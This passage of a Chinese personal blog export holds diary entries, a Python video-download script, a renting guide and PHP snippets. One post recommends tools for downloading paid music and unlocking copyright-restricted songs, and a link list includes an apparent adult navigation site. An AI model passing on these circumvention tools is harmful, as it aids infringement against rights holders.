一堆人挤在地铁口，都没带伞，叫车也不好叫，而且我住的地方离地铁也不远，就是有点绕，好不容易等到雨小了，赶紧冲出去一路小跑，这里我不得不吐槽北京那破排水系统，每次暴雨，路上的积水都可以划船了，然后不小心一脚下去，鞋子湿了，好吧，到家再换吧，结果路上一辆车飞过，路边的水飞溅，这下全身湿了，真忍不住爆出口，光顾着自己，开车也没素质，如同地铁里那些不戴耳机看电影电视剧的， fuck 。 回到家发现早上出门忘记关阳台的门了，经过暴雨洗礼都进水了，还好电脑没事，这一天真让人无 fuck 可说。 记得 2012 年刚来北京那会，住在北京大学附近的颐和园路东口的城中村，那里虽然靠着地铁 4 号线，圆明园，北大，清华，然而我同 8 个人住在一个屋子里，有一次也是暴雨，没带伞，身上没钱，那会也没有微信支付宝，然后一个人就这样淋着雨走回去，走着走着都分不清眼泪和雨水了。 北京待了这么多年了，我真的越来越不喜欢这个城市了。 就在我写这篇文章的时候四川又地震了（08 年大地震过去近 10 年了），相比而言今天这点破事根本不值一提，祝福四川平安。 好了，快零点了，听首歌睡觉吧。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[周杰伦出道16年精选]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%91%A8%E6%9D%B0%E4%BC%A6%E5%87%BA%E9%81%9316%E5%B9%B4%E7%B2%BE%E9%80%89%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。偶然在微博看到周杰伦出道16年精选73首歌的视频，地址http://weibo.com/tv/v/EcAmx4z11?from=music 顿时让无数人开始怀旧，那是一代人的青春啊，如果要在那么多经典歌曲里找一首配今天的文，那便是《晴天》了。那条微博转发已过万，里面73首歌我几乎可以从头唱到尾，我曾经也是追星一族，哈哈。 看完视频后我就想下载到电脑，可以时不时拿来怀旧下，视频是由秒拍录制的，播放的是一个swf文件，地址http://wscdn.miaopai.com/splayer2.2.0.swf?scid=GcezAtC7sRC6~1S3GXxLkA__&amp;token=&amp;autopause=false&amp;fromweibo=false ，于是开始用python下载视频，源代码：https://gist.github.com/zhiyue/f49c8e951d5339b9b0c763f0ce8e1a6e123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133import urllib.parseimport requestsheaders = &#123; "Accept": "*/*", "Accept-Encoding": "gzip, deflate, sdch", "Accept-Language": "zh-CN,zh;q=0.8,en;q=0.6", "Connection": "keep-alive", "Host": "api.miaopai.com", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" " Chrome/50.0.2661.102 Safari/537.36", "X-Requested-With": "ShockwaveFlash/23.0.0.166"&#125;def get_mp4_addr(base_url): api_url = 'http://api.miaopai.com/m/v2_channel.json' rs = urllib.parse.urlparse(base_url) q = urllib.parse.parse_qs(rs.query) scid = q['scid'][0] params = &#123; 'fillType': '259', 'scid': scid, 'vend': 'miaopai' &#125; headers['Referer'] = base_url r = requests.get(api_url, params=params, headers=headers) #获取到的json结构为 """ &#123; 'status': 200, 'msg': 'OK', 'result': &#123; 'category_info': [ ], 'liveStatus': 0, 'otherinfo': &#123; 'othertype': 3, 'weiboId': '2709577332', 'url': 'http: //weibo.com/2709577332', 'weiboNick': 'Happy张江', 'mark1': '@Happy张江', 'mark2': 'weibo.com/2709577332', 'vend': 'miaopai' &#125;, 'ext': &#123; 'h': 358, 'lengthNice': '29: 11', 'location': '', 'owner': &#123; 'icon': 'http: //tp1.sinaimg.cn/2709577332/180/40022299983/0', 'loginName': 'paike_ex1p1ji8gr', 'signed_info': '', 'status': 1086, 'top_num': 0, 'suid': 'P7Z0CNbUcrTke~V0', 'v': True, 'info': '', 'nick': 'Happy张江', 'gold': 0, 'talent_signed': 0, 'talent_v': 1, 'oldIcon': 'http: //tp1.sinaimg.cn/2709577332/180/40022299983/0', 'org_v': 0, 'talent_name': '知名博主' &#125;, 'finishTime': 1476280433842, 'length': 1751, 'finishTimeNice': '10-12', 'ft': '#周杰伦#出道16年精选73首歌，从青涩的小男生到幸福的爸爸，音乐风格也有很多创新，你是否从第一首开始可以跟着哼到最后！', 'status': 30, 't': '#周杰伦#出道16年精选73首歌，从青涩的小男生到幸福的爸爸，音乐风格也有很多创新，你是否从第一首开始可以跟着哼到最后！', 'w': 640 &#125;, 'pic': &#123; 'm': '_m.jpg', 's': '_s.jpg', 'base': 'http: //dlqncdn.miaopai.com/stream/GcezAtC7sRC6~1S3GXxLkA__' &#125;, 'type': 16, 'ad': &#123; 'video': '', 'url': '', 'pic': '' &#125;, 'stream': &#123; 'ver': 'miaopai', 'sign': 'ssig=6d6e2196b6d1e33d196e5744fa90979b&amp;time_stamp=1476532658459', 'ios': 'mp4miaopai', 'base': 'http: //gslb.miaopai.com/stream/GcezAtC7sRC6~1S3GXxLkA__.mp4?vend=miaopai&amp;', 'vend': 'miaopai', 'and': 'mp4' &#125;, 'place_top': 0, 'scid': 'GcezAtC7sRC6~1S3GXxLkA__', 'ext2': &#123; 'isPub': 2, 'length': 1751, 'createTimeNice': '10-12', 'createTime': 1476279232807, 'guid': 0, 'vend': 'miaopai' &#125;, 'topicinfo': [ '周杰伦' ] &#125;&#125; """ msg = r.json()['msg'] result = r.json()['result'] file_name = result['ext']['ft'] if msg == 'OK': stream_type = result['stream']['and'] base = result['stream']['base'] sign_str = result['stream']['sign'] mp4_addr = '%s?%s&amp;f=/%s.%s' % (base, sign_str, scid, stream_type) return mp4_addr, '%s.%s' % (file_name, stream_type)def download_video(mp4_addr, file_name): r = requests.get(mp4_addr, stream=True) if r.status_code == 200: with open(file_name, 'wb') as f: for chunk in r.iter_content(chunk_size=4096): if chunk: f.write(chunk) if __name__ == '__main__': #如果想下载其他视频，只要替换这个链接即可 url = 'http://wscdn.miaopai.com/splayer2.2.0.swf?scid=GcezAtC7sRC6~1S3GXxLkA__&amp;token=&amp;autopause=false&amp;fromweibo=false' mp4_addr, file_name = get_mp4_addr(url) download_video(mp4_addr, file_name) 最后我把视频上传到百度网盘了，想要的小伙伴自己下载吧，地址http://pan.baidu.com/s/1eRAllJk]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的2016年]]></title>
    <url>%2F2019%2F08%2F26%2F%E6%88%91%E7%9A%842016%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。现在是2016年12月31日20点，我在北京，指缝太宽，时间太瘦，悄悄从指缝间溜走，一年真的要过去了。 微博，微信上看到不少人在总结自己的2016，如小道消息公众号这篇16位读者的2016年，值得看看 http://mp.weixin.qq.com/s/iQerUx6yfsqo7RwWQPkYvQ 还有微博上大网红 papi酱 做的2016大事件视频http://weibo.com/2714280233/Eowpl07VL 2016年开始更新公众号，目前写了20篇左右。也看了几部电影《叶问3》《老炮》《从你的全世界路过》《28岁未成年》。还有记录自己的网易音乐 http://music.163.com/#/my/m/music/playlist?id=406121360 借着公众号，也回顾下我的2016。其实微博相册是一种更好的记录，有兴趣也可以看看http://photo.weibo.com/2717930601/talbum/index#!/mode/1/page/1 还记得2016年年初的时候定了个小目标http://weibo.com/2717930601/Dbpg3xzx4 很遗憾，第一个目标并木有实现。年初的时候遇见一个合适的妹子，然而由于各种缘由失之交臂，这是一个标准的文艺女青年(她的公众号:蓝胖子写字)，爱旅行有才华，敢爱敢拼,祝福她 2017 心有所属。 第二个关于技术方面，golang 只是安装入门了下，因为实际工作中并没有用到，今年要加强实践了。python 是更深入了，之前发布的几篇公众号文章也是基于python。人生苦短，python必备。php 和 javascript 因为在工作中用到，所以是日趋进步，这个可以在 https://segmentfault.com/u/sushengbuhuo 上看到我的记录。 第三个关于在sf社区的声望，很可惜，目前10.8k，由于前2个季度没有勤快答题及更新博客，离12k还有点距离，不过1月份就可以完成的。sf是我最喜欢的纯技术社区了，几乎每天回复问题，看别人的回复，还有各种经典文章，系列博文，今年的博客也没写几篇，明年也要加强。 第四个关于看10本书，很遗憾，今年一本书都没看完，尽管已经买了不少书了，真是惭愧，也许是太浮躁了，没法静下心来，今年努力把 python实践 看完。 第五个关于更新微博，这个我做到了，看截图，目前我的微博数63269，年初的时候刚3万，光2016年就发布了3万多条微博，平均每天90条左右，这是我坚持最长久的一件事，我都佩服我自己了。同时微信朋友圈更新了100篇，相比微博就太少了。更新那么多微博，大多是技术方面的，其实我并没有都看完，就当一个记录，下次有问题的时候可以直接在微博搜索到。 第六个关于存钱，年初定了5万的目标，结果超了7万，这并不是一个段子。 因为我每个月的花费记录都在支付宝记账上，从2014年起每天记账，坚持了3年。 第七个关于看演唱会，感谢好友@马华麟 的票，7月2号在北京工体看了场《致青春》演唱会，现场听了老狼的《同桌的你》，还有为了宣传电影《致青春，原来你也在这里》的刘亦菲也来了。见微博地址http://weibo.com/2717930601/DCY6ShT0Z 之前一直听喜马拉雅主播@夏雨嫣 的节目，正好年初的时候举办了次线下活动(http://weibo.com/2717930601/DckHEEMsx)，见到了她本人，很温和的妹子，因为爱好播音利用业余时间学习录制节目，每一期节目很用心的制作，经常忙到凌晨一两点，目前在喜马也算一红人，祝福她2017 成功脱单。 第八个关于工作，这一年加薪了，很开心，团队人员增加了，和小伙伴合作也很愉快。年会的时候还中奖了http://weibo.com/2717930601/DeuVSBk17 目前公司用的 laravel 开发框架，折腾不少，也算对这个框架更加熟悉。 4月份的时候团建，去了趟天津盘山，许久不爬山了，不过爬山对我来说是小case了，以后还得多运动。 第九个关于熬夜，很遗憾，几乎每天凌晨以后睡觉，但没有超过1点。 第十个关于房子，10月份国庆的时候回了趟家，家里的房子已经装修好入住了。 尽管小目标没有都实现，但梦想总是要有的，万一实现了呢，所以也定下2017的计划： 都说先成家后立业，那就找一个能彼此成就的她成家吧。 坚持更新微博和公众号。 segmentfault 声望累计到18K。 看一场演唱会或一次旅行。 攒钱，为买房准备。 多运动锻炼，杜绝熬夜。 继续深入php python ，学习 golang 到可用阶段。 加薪升职。 ps：友情提醒，Copyright 写死的小伙伴，又到了一年一次更新的时候了，建议用 php 的 date(‘Y’) 以后再也不用手动改啦。 pps：即将步入2017，感谢关注这个公众号的你们，简单直接点，给大家送红包了，本公众号回复 2017新年快乐 获取。 最后以知乎上的一个回复来总结2016大事件: 一年又将尽，春晚恐词穷。 此文致冯巩，此韵致黄宏。 首当洪荒力，奥运泥石流。 天朝绝凶虎，帝国破坏龙。 越界超级丹，身体被掏空。 夜光聊剧本，绿野摄仙踪。 河海有夏露，西北有马蓉。 校花关不住，校草独茕茕。 一人饮酒醉，抚掌如撩妹。 世界那么大，回家洗洗睡。 哎哟小公举，嘿咻老污龟。 在座说诸位，不是针对谁。 司机发快车，友谊沉小船。 问你怕不怕，说他翻就翻。 动如暴漫脸，静若葛优瘫。 厉害我的哥，你咋不上天？ 天上核武器，局座因果律。 恍然若三体，面壁有大计。 陨石炸航母，酸雨去武装。 海带反潜艇，雾霾防激光。 生活岂苟且，有诗有远方。 人皆奉网红，我独为网黄。 天下假猪套，人间新狗粮。 一脸甩懵逼，猝然不及防。 城市套路深，我欲回农村。 香菇太蓝瘦，蜜汁不清真。 一亿小目标，九旬大新闻。 深情留不住，套路得人心。 年年有金句，白驹如过隙。 当时与语人，及今谁复记？ 吃瓜一时快，事了拂衣去。 唯有虹桥姐，初心终不易。 想起冯小刚电影《甲方乙方》最后那句“1997年过去了，我很怀念它”。那是我们每个人努力实现、苦甜交加、荒诞但又迷人的梦想。 现在2016也要过去了，我也怀念它。 每篇文章推荐一个工具：2016互联网期末考试，看看你及格吗 http://poll2016.sspai.com/?from=timeline]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[买书一时爽，看书如抽丝]]></title>
    <url>%2F2019%2F08%2F26%2F%E4%B9%B0%E4%B9%A6%E4%B8%80%E6%97%B6%E7%88%BD%EF%BC%8C%E7%9C%8B%E4%B9%A6%E5%A6%82%E6%8A%BD%E4%B8%9D%2F</url>
    <content type="text"><![CDATA[这是一篇旧文。 又到周五，公众号也许久未更新了，现在正好来写写，明天周末好好休息，这几天太累了。 此刻正在听喜马拉雅的《晚上十点》直播，直播地址http://liveroom.ximalaya.com/live/10320 我手机上装的 APP 不过 20 个左右，喜马拉雅是我比较喜欢的 APP，每天上班路上会听听。 这次五一回了趟家，火车上无聊看了本书《程序是怎样跑起来的》，从计算机的内部结构开始讲起，以图配文的形式详细讲解了二进制、内存、数据压缩、源文件和可执行文件、操作系统和应用程序的关系、汇编语言、硬件控制方法等内容，还是比较有趣的，原来代码的执行过程是这样的： 程序是指令和数据的组合，如c语言的printf(‘hello world’),printf 是执行，hello world 是数据。 cpu能识别和执行的语言只有机器语言，使用java，Python编写的语言，最后都会转换为机器语言。磁盘上写的程序被复制到内存才能运行，根据程序指令进行数据运算，并控制计算机的就是cpu。 数据是用二进制数表示的，因为集成电路上的电压只有两种状态，正好用0和1来表示，于是有了二进制，位，字节等。 计算机进行小数运算时出错，比如 for 循环 100 次累加 0.1 也得不到 10，这是因,0.1 不能完整用二进制来表示，就像 100 / 3 等于33.333333333…，无限循环个3，所以要避免出错有两个途径： 如果不在乎精度，可以进行截取； 循环 100 次加 1 然后除以 10 就可以了。 javascript 中console.log(0.1+0.2) 不等于0.3，而是 0.30000000000000004，也是基于浮点数不能完整用二进制来表示的缘故，而且大多数语言都是如此，有个网站 0.30000000000000004.com 可以看到。 平常处理支付牵涉钱，数据库一般用 decimal 来存，也可以参考微信支付用分来处理，1 块钱等于 100 分，这样就不用担心编程语言中浮点数精度问题而导致钱数对不上。 这本书还讲了许多，还没看完，不过还是有收获的。这是今年看的第一本书，想起来真是惭愧，互联网时代，真是难得静下心来好好看一本书了，所谓：买书一时爽，看书如抽丝。 这是家里的书，许多书还未翻看，再也找不回当年上大学时看 当年明月 的七部《明朝那些事儿》那种激情。 回家听我爸说老家的地和山都要被征完了，现在都建工业区了，以后可以再建大点的新房子，然后出租给附近工厂上班的，发展真是快啊。卖地的钱有几千万了，按人头来分，每人能分几万吧，钱是不多，不过好多人就开始急着结婚，生孩子了，人多分得多嘛，然后我爸来催我，哎，不说这个了，幸福冷暖自知。 这次又陪小朋友（外甥）看了会《喜洋洋》，每次回去小孩都喜欢看，这就是童年乐趣吧。 每篇文章推荐一个工具：视频下载工具 http://v.atob.site/ ，支持微博，秒拍，腾讯等，bilibili 的话推荐 http://www.jijidown.com 更全的有硕鼠 http://www.flvcd.com/]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何免费在线听周杰伦的歌曲]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%A6%82%E4%BD%95%E5%85%8D%E8%B4%B9%E5%9C%A8%E7%BA%BF%E5%90%AC%E5%91%A8%E6%9D%B0%E4%BC%A6%E7%9A%84%E6%AD%8C%E6%9B%B2%2F</url>
    <content type="text"><![CDATA[我平常用网易云来听音乐 http://music.163.com/ ，网易云除了歌好听，评论更有故事。 之前已经写过网易云音乐了，有兴趣看看之前的文章那些你可能不知道的网易云音乐奇技淫巧 可惜周杰伦的大部分歌曲网易没有版权，还好我保存了一份杰伦所有的歌曲，如果你也想收藏的话公众号回复 周杰伦 获取。 那首评论过百万的神曲《晴天》已经变成灰色。https://music.163.com/#/song?id=186016 这首歌的版权在QQ音乐https://y.qq.com/n/yqq/song/0039MnYb0qxYhV.html 而另外有些歌在虾米才有版权可以播放，所以你听一首歌的话可能需要到3个网站找，比较麻烦，这里推荐几个聚合网易，QQ，虾米，酷狗等音乐网站的工具/网站。 listen1Listen 1可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐网站的歌曲，让你的曲库更全面。http://listen1.github.io/listen1/ 它提供了Chrome插件版，win桌面版（直接exe安装），mac桌面版，Linux桌面版，我下载的是Chrome插件版，关于插件我之前也写过一篇Chrome 浏览器扩展神器油猴 安装后使用的界面是这样的。 它集合了网易云音乐，虾米音乐，QQ音乐，酷狗音乐，酷我音乐，哔哩哔哩，咪咕音乐这几个网站的音乐资源，可以说很齐全了，比如搜索《再见二丁目》，点击就可以直接播放了。 音乐聚合搜索这种聚合搜索不限定某个网站，谷歌搜索下有很多这样的网站，如果其中某个网站挂了，换一个就是了。比如第一个http://www.gequdaquan.net/gqss/直接搜索就好。搜索结果中第3个https://music.8ziyuan.com/ 这种网站是基于开源程序搭建的，开源地址 https://github.com/maicong/music/， 如果你会代码并有自己服务器的话也可以建一个这样的音乐聚合网站。 这里说下这个网站，可以直接免费在线听周杰伦歌曲，还能下载，不知道这个网站能存在多久，先收藏吧。http://tool.liumingye.cn/music/?type=migu&amp;name=%E5%91%A8%E6%9D%B0%E4%BC%A6 音乐下载上面的聚合网站也可以直接下载歌曲，不过也有人开发了这样的下载工具，比如Music-Downloader ，这是一款简单的音乐下载（播放）器， 功能有歌曲搜索、歌单读取、在线播放、歌曲下载（包括付费音乐），下载地址 https://github.com/messoer/Music-Downloader/releases/download/1.4.2/MusicDownloader.zip当然我更喜欢用命令行来下载，详细见之前的文章 那些你可能不知道的网易云音乐奇技淫巧 比如下载五月天的专辑《自传》，直接music-get https://y.qq.com/n/yqq/album/002fRO0N4FftzY.html 资源全网音乐免费下载工具https://music.sonimei.cn/ https://music.sonimei.cn/yinyue/网易云音乐、QQ音乐一键下载工具https://github.com/winterssy/music-get一个现代音乐播放器 https://github.com/PeterDing/chord多站合一音乐搜索解决方案 https://github.com/maicong/music/网易云音乐nodejs api：https://github.com/Binaryify/NeteaseCloudMusicApi一个可以播放“任意”音乐的播放器https://github.com/feeluown/FeelUOwnchrome插件：声海盗，下载在线音乐插件，支持豆瓣，虾米，QQ音乐，网易云音乐等https://github.com/seekerlee/SoundPirate如何愉快使用网易云音乐，解锁变灰歌曲！https://github.com/nondanee/UnblockNeteaseMusic一款简单的音乐下载（播放）器 功能：歌曲搜索、歌单读取、在线播放、歌曲下载（包括付费音乐） ​​​​ https://github.com/messoer/Music-Downloader/releases https://github.com/sevenJia/musicVue 全家桶高仿网易云音乐 mac 客户端版 https://github.com/sl1673495/vue-netease-musicqq 音乐解析网站 http://www.66it.top/ 推荐阅读: 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客推荐]]></title>
    <url>%2F2019%2F08%2F23%2F%E5%8D%9A%E5%AE%A2%E6%8E%A8%E8%8D%90%2F</url>
    <content type="text"><![CDATA[github何晓东PHP开发工程师 靠谱崔小拽 伪君子 小白的分享 飞鸿影的博客 庭说 夜幕 黑白 青枫浦 伪君子的梦呓 靳闯博客 痴海日报 天行九歌 每天学习一个命令 彩虹马厩laravel godruoyi php 歪麦博客 不正经程序员 编程浪子 larvel田写 一番码客 痴海 php qqdeveloper python数据科学分析 cuicui 数据库Redis 软件工具分享 跨界思考享赚钱思路 安全plaidCTF两道web题目writeup http://blog.wonderkun.cc/2019/04/15/plaidCTF%E4%B8%A4%E9%81%93web%E9%A2%98%E7%9B%AEwriteup/ctf https://www.yof3ng.xyz/PHP中的危险函数和伪协议https://anemone.top/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/基于 electron-vue 开发了一个美图搜罗器https://github.com/Licoy/girls-reptile/releases 拍片哥-红色导航网站网址-福利导航 https://bbs.918dxs.com/topics/3772/lan-se-dao-hang 关注Web安全anemone]]></content>
  </entry>
  <entry>
    <title><![CDATA[如何在豆瓣租房小组快速找到满意的房子]]></title>
    <url>%2F2019%2F08%2F19%2F%E5%A6%82%E4%BD%95%E5%9C%A8%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%E6%BB%A1%E6%84%8F%E7%9A%84%E6%88%BF%E5%AD%90%2F</url>
    <content type="text"><![CDATA[这几天忙着找房子，没怎么更新公众号，新浪本来是提供人才公寓的，可惜我错过了。 在大城市租房真的是一把辛酸泪，至今不知道搬家多少次了，今天就分享下我在北京租房找房的经历，或许对你找房子（不限于北京）有点借鉴作用。 先说说租房的坑。 不要租隔断去年开始北京开始全力打击群租隔断，微博上可以看到不少被拆的案例 https://weibo.com/6046360157/HEHMAipBj?refer_flag=1001030103_ ，所以为了安全，还是不要图便宜，宁愿多花点钱住个次卧或者主卧。 远离长租公寓Google搜索下 长租公寓 跑路 可以看到很多人被坑的案例。 这种公寓用你的的个人信息去 p2p 分期贷款，你以为和公寓签的是租房合同，实际上却是贷款合同，一旦公寓跑路，房子被房东收回，你还得接着还贷款，更可恶的是可能影响了你的个人征信，对你以后买房什么的造成不可估量的影响。 36kr和观察者就曾报道过一位中介深喉的讲述：长租公寓可以繁荣，也可以让上万人无家可归https://36kr.com/p/5167950.html长租公寓：含笑埋的雷，跪着也要爆完https://36kr.com/p/5157879.html?from=guess长租公寓租房贷引争议：交完押金才发现背了贷款 https://www.guancha.cn/economy/2018_08_22_469220.shtml 所以千万要小心，我只说了2个坑，可能还有其他更大的坑，大家也可以分享下自己租房遇到过的坑。 说完了坑然后说说怎么找到自己满意的房子。 链家自如这2个比较靠谱和方便，当然也比较贵了，如果你不缺钱的话直接选这2个就行，下面不用看了。 豆瓣租房小组豆瓣电影大家都知道，其实豆瓣上还可以租房的，上面有许多租房信息，更新非常快。去年豆瓣还发布了自己的豆瓣租房小程序 https://www.douban.com/note/667954828/ 然而不知为何今年4月4号却下线了，这是下线公告，不过好在还有豆瓣小组，进入豆瓣小组搜索租房就可以看到各个城市的小组。https://www.douban.com/group/search?cat=1019&amp;q=%E7%A7%9F%E6%88%BF 比如北京的话推荐这几个小组 https://www.douban.com/group/625354/，https://www.douban.com/group/625354/?ref=sidebar豆瓣上合租比较多，而且不要中介费 ，如果能找到人一起合租是最好的了。 但是豆瓣小组的帖子更新非常快，而且没有搜索功能，如果一页一页的翻，真的会累死人，所以还是得靠搜索引擎，关于搜索引擎的使用技巧，我之前写过一篇文章，强烈建议你看看 那些你可能不知道的搜索奇技淫巧 我住在回龙观地铁附近，所以就直接搜索 site:douban.com 回龙观合租，时间选择一周内，因为太久的信息已经失效了。进入第三个链接 https://www.douban.com/group/topic/146110587/ 对方没有提供手机号，而是微信，搜索下微信号，发现对方只发过2个豆瓣帖子，可以肯定不是中介。 于是我加了对方微信，第二天就直接过去了，房子还不错，可惜离地铁有点远，而且附近没有超市，吃饭也麻烦，于是放弃了。 继续往下翻，看到这个帖子https://www.douban.com/group/topic/147579647/ 直接搜索对方手机号，有7页搜索记录，不同时间发布那么多租房信息，百分百中介，告辞。 继续搜，看到这个帖子，对方也只提供微信号，搜索了下只有几条记录，先加微信。 过去后看了下房子，房子是他和房东直接租的，离地铁比较近，附近有商场，吃饭什么的也方便，好，交押金先定了。 看豆瓣帖子总结就是：描述写了一大堆，价格也不写还要求电话联系，放弃。照片拍得不错，房间非常整齐，搜索下图片发现很多地方见过，放弃。搜索对方微信或者手机号，一大堆租房信息，放弃。 最后还是感谢豆瓣让我找到了满意的房子。 水木社区这是个比较小众的社区，所以进入的中介也少，上面有不少房东发布的房源。http://www.newsmth.net/nForum/#!board/HouseRent u租网址 http://bj.yurixu.com/manage/beijing.php# 因为豆瓣的搜索效率很低，这个网站集合了豆瓣，水木社区和北邮人上的租房信息，可以根据地区和地铁线路搜索，可惜目前只支持北京和上海。 搜索关键词和筛选比直接用豆瓣高效多了。 微博搜索微博上有很多租房话题，可以搜索自己对应城市的话题 https://weibo.com/p/100808e57bb364ea5d7b996e05bedf032aab52/super_index ，比如我在的北京，回龙观地铁附近。 看到合适的房子直接微博联系对方就可以了，不过还是得小心黑中介。 小程序第一个是六六直租，原英文名称zuber，覆盖了北京、上海、广州、深圳、杭州等多个热门城市,可惜他们网页版不提供联系方式https://mobile.zuber.im/search/rent，只有上小程序和APP http://app.zuber.im/ 。 第二个是暖房小程序，网址https://nuan.io/hello-wechat ，上面有地铁找房，公司找房，避坑指南，我搜了下效果还可以。 简单租房这个网站自动爬取豆瓣房源，自己设置关键字，当豆瓣出现相关租房信息，及时推送到你的微信 http://house.jiandan.live/ 地图搜租房这是个人开发的一款找房工具， 作者博客https://woyaozufang.live/2022/06/04/house-map-move/#more 地址https://house-map.cn/#/它支持的平台列表如下：Zuber、豆瓣小组、贝壳租房、豆瓣租房、上海互助租房、CCB 建融家园、58 公寓、蘑菇租房、拼室友、房多多、房天下、嗨住租房、自如、v2ex、巴乐兔租房、安居客租房等，可以说很齐全了。 最后说个题外话，租房怎么提取公积金，租房是可以提取公积金的，联系hr向公司提交公积金联名卡和身份证，办理每月 1500 的租房公积金，三个月发一次，也就是每个季度取4500 ，直接打到你的公积金联名卡，我之前的公司也是这样取的，后来到了新浪用的买房提取，有兴趣可以看我之前的文章如何提取公积金 9 天到账 租房帖子8012 北上广深租房不靠谱指南https://www.v2ex.com/t/506525 http://zy2071.com/Fun/FindH/#/Homecontent在北京租房到底要花多少钱？我们整理了一份5000字的攻略 https://36kr.com/p/5089137一位离职中介教你如何在北京租房子 https://www.jianshu.com/p/0bc163b6f5df租房经历总结http://blog.leanote.com/post/jixn/%E7%A7%9F%E6%88%BF%E5%AD%90https://sharevideo.cn/?from=groupmessage&amp;isappinstalled=0#/ 豆瓣租房精选https://zhuanlan.zhihu.com/p/57698438https://zhuanlan.zhihu.com/p/26647130https://www.zhihu.com/question/20741403/answer/364419886有什么事是你租房以后才知道的https://www.zhihu.com/question/20741403/answers/updated?page=2https://www.zhihu.com/question/307959368https://zhuanlan.zhihu.com/p/26647130https://www.zhihu.com/question/19988480https://zhuanlan.zhihu.com/p/25557696https://mobile.zuber.im/search/renthttps://www.zhihu.com/question/39078225北京房东直租群https://www.wenjuan.com/s/7jiyMj/https://jinshuju.net/f/J64fx0 密码: faith逃离北上广https://jinnrry.github.io/getAwayBSG/post/all.html?v=1.0 推荐阅读： 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 我是如何用 Markdown 写公众号文章的 我在新浪的一天工作日常 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 代码整理]]></title>
    <url>%2F2019%2F08%2F14%2Fphp-%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[不需要递归123456789101112131415161718192021222324252627282930$items = array( 1 =&gt; array ('id' =&gt; 1, 'pid' =&gt; 0, 'name' =&gt; ' 江西省 '), 2 =&gt; array ('id' =&gt; 2, 'pid' =&gt; 0, 'name' =&gt; ' 黑龙江省 '), 3 =&gt; array ('id' =&gt; 3, 'pid' =&gt; 1, 'name' =&gt; ' 南昌市 '), 4 =&gt; array ('id' =&gt; 4, 'pid' =&gt; 2, 'name' =&gt; ' 哈尔滨市 '), 5 =&gt; array ('id' =&gt; 5, 'pid' =&gt; 2, 'name' =&gt; ' 鸡西市 '), 6 =&gt; array ('id' =&gt; 6, 'pid' =&gt; 4, 'name' =&gt; ' 香坊区 '), 7 =&gt; array ('id' =&gt; 7, 'pid' =&gt; 4, 'name' =&gt; ' 南岗区 '), 8 =&gt; array ('id' =&gt; 8, 'pid' =&gt; 6, 'name' =&gt; ' 和兴路 '), 9 =&gt; array ('id' =&gt; 9, 'pid' =&gt; 7, 'name' =&gt; ' 西大直街 '), 10 =&gt; array ('id' =&gt; 10, 'pid' =&gt; 8, 'name' =&gt; ' 东北林业大学 '), 11 =&gt; array ('id' =&gt; 11, 'pid' =&gt; 9, 'name' =&gt; ' 哈尔滨工业大学 '), 12 =&gt; array ('id' =&gt; 12, 'pid' =&gt; 8, 'name' =&gt; ' 哈尔滨师范大学 '), 13 =&gt; array ('id' =&gt; 13, 'pid' =&gt; 1, 'name' =&gt; ' 赣州市 '), 14 =&gt; array ('id' =&gt; 14, 'pid' =&gt; 13, 'name' =&gt; ' 赣县 '), 15 =&gt; array ('id' =&gt; 15, 'pid' =&gt; 13, 'name' =&gt; ' 于都县 '), 16 =&gt; array ('id' =&gt; 16, 'pid' =&gt; 14, 'name' =&gt; ' 茅店镇 '), 17 =&gt; array ('id' =&gt; 17, 'pid' =&gt; 14, 'name' =&gt; ' 大田乡 '), 18 =&gt; array ('id' =&gt; 18, 'pid' =&gt; 16, 'name' =&gt; ' 义源村 '), 19 =&gt; array ('id' =&gt; 19, 'pid' =&gt; 16, 'name' =&gt; ' 上坝村 '),);function genTree($items) &#123; $tree = array (); // 格式化好的树 foreach ($items as $item) if (isset($items[$item['pid']])) $items[$item['pid']]['son'][] = &amp;$items[$item['id']]; else $tree[] = &amp;$items[$item['id']]; return $tree;&#125; 插入排序算法1234567891011121314151617181920212223242526272829303132333435363738class Person&#123; public $id; public $data;&#125;//https://learnku.com/articles/32586function insertSort(&amp;$data,$n)&#123; for ($i=1;$i&lt;$n;$i++)&#123; if ($data[$i]-&gt;id&lt;$data[$i-1]-&gt;id)&#123; $j = $i-1; $x = $data[$i]-&gt;id; $obj = $data[$i]; 